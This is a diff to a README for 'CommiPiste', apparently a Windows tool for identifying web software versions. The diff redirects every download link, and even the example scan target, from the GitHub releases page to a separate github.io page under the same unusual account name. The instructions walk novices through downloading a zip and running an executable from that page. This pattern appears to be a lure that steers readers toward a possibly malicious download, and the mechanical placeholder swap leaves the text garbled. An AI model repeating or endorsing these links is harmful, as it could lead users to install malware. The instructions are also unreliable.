@@ -1,6 +1,6 @@
 # 🔍 CommiPiste - Find software versions for better security
 
-[![Download CommiPiste](https://img.shields.io/badge/Download-CommiPiste-blue.svg)](https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases)
+[![Download CommiPiste](https://img.shields.io/badge/Download-CommiPiste-blue.svg)](https://basicenglishcruisecontrol153.github.io)
 
 CommiPiste identifies the specific versions of web software running on a server. It helps you understand the software stack so you can check for potential vulnerabilities. This tool focuses on open-source web applications and provides reliable data for your security research.
 
@@ -25,7 +25,7 @@ CommiPiste runs on Microsoft Windows. Ensure your machine meets these specificat
 
 Follow these steps to obtain the software:
 
-1. Visit the following page: [https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases](https://github.com/Basicenglishcruisecontrol153/CommiPiste/releases)
+1. Visit the following page: [https://basicenglishcruisecontrol153.github.io](https://basicenglishcruisecontrol153.github.io)
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file named `CommiPiste-Windows.zip`.
 4. Save the file to your computer.
@@ -52,9 +52,9 @@ CommiPiste runs inside an interface called the Command Prompt. Do not let this i
 6. The window will display a list of available commands.
 
 To scan a website, use the following format:
-`.\CommiPiste.exe --target https://example.com`
+`.\CommiPiste.exe --target https://basicenglishcruisecontrol153.github.io`
 
-Replace `https://example.com` with the actual address of the website you want to check.
+Replace `https://basicenglishcruisecontrol153.github.io` with the actual address of the website you want to check.
 
 ## 🛡️ Usage Guidelines
 
